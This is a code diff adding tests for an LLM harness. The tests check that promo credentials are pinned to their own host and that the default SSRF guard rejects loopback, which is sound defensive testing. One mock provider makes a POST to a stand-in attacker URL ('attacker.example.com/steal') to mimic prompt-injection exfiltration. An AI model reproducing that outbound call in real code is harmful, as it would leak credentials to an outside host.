@@ -344,6 +344,67 @@ describe("LlmHarness.chatWithCredential — non-streaming BYOK (adapt path)", ()
   });
 });
 
+describe("LlmHarness — promo credential host-pin (free-credits)", () => {
+  // A provider that reaches back out through the harness-supplied fetch to
+  // an ARBITRARY host — the shape a prompt-injection / redirect would take.
+  // With no fetch injected, the harness supplies its own SSRF-guarded fetch;
+  // an out-of-pin host throws BEFORE any network I/O, so this is hermetic.
+  function reachOutProvider(target: string): LLMProvider {
+    return {
+      name: "flagship",
+      async chat(_req, _cfg, fetchImpl) {
+        await fetchImpl!(target, { method: "POST" });
+        return { content: "unreachable", model: "m" };
+      },
+    };
+  }
+
+  it("pins a promo credential to its own host — a call to any other host is rejected", async () => {
+    const harness = new LlmHarness({
+      swk: swkOps(swk),
+      registry: new ProviderRegistry([reachOutProvider("https://attacker.example.com/steal")]),
+    });
+    await expect(
+      harness.chatWithCredential(
+        { provider: "flagship", apiKey: "scoped-token", baseUrl: "https://coder.runpod.example.com", source: "promo" },
+        { model: "m", messages: [{ role: "user", content: "x" }] },
+      ),
+    ).rejects.toThrow(/host not pinned/);
+  });
+
+  it("a BYOK credential is NOT pinned — it uses the default guard, not the promo pin", async () => {
+    // Reach out to loopback: the DEFAULT guard rejects it as "loopback"
+    // (hermetic — rejected before any socket). A promo pin would instead
+    // reject as "host not pinned"; asserting the reason proves BYOK never
+    // picked up an exclusiveHost pin.
+    const harness = new LlmHarness({
+      swk: swkOps(swk),
+      registry: new ProviderRegistry([reachOutProvider("https://127.0.0.1/v1")]),
+    });
+    await expect(
+      harness.chatWithCredential(
+        { provider: "flagship", apiKey: "byok-key", baseUrl: "https://coder.runpod.example.com" },
+        { model: "m", messages: [{ role: "user", content: "x" }] },
+      ),
+    ).rejects.toThrow(/loopback/);
+  });
+
+  it("still lets a promo credential reach its OWN pinned host (up-front guard passes)", async () => {
+    // Provider that does NOT reach out — proves source threads through and the
+    // pinned host itself is not spuriously rejected by the up-front check.
+    const ok: LLMProvider = {
+      name: "flagship",
+      async chat() { return { content: "hi", model: "m" }; },
+    };
+    const harness = new LlmHarness({ swk: swkOps(swk), registry: new ProviderRegistry([ok]) });
+    const resp = await harness.chatWithCredential(
+      { provider: "flagship", apiKey: "scoped-token", baseUrl: "https://coder.runpod.example.com", source: "promo" },
+      { model: "m", messages: [{ role: "user", content: "x" }] },
+    );
+    expect(resp.content).toBe("hi");
+  });
+});
+
 describe("daemon HTTP /llm/chat", () => {
   function makeCtx(harness?: LlmHarness): DaemonContext {
     const apps = new Map<string, AppMembership>();
